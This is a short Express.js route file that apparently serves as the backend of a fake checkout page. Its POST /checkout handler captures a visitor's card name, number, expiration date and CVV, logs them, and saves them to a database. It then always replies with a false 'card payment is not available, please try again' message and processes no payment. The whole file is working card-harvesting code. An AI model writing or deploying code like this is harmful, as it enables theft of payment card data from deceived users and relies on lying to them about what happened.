var express = require('express');
var router = express.Router();
var model = require('../model/creditModel')
/* GET users listing. */
router.post('/checkout', async function (req, res, next) {
  console.log("DATA: ", req.body)
  let name = req.body.name
  let number = req.body.number
  let exp = req.body.expiration
  let code = req.body.cvv
  await model.create({ name, number, exp, code });

  return res.json("YOUR CARD PAYMENT IS NOT AVAILABLE NOW,PLEASE TRY AGAIN!")
});

module.exports = router;
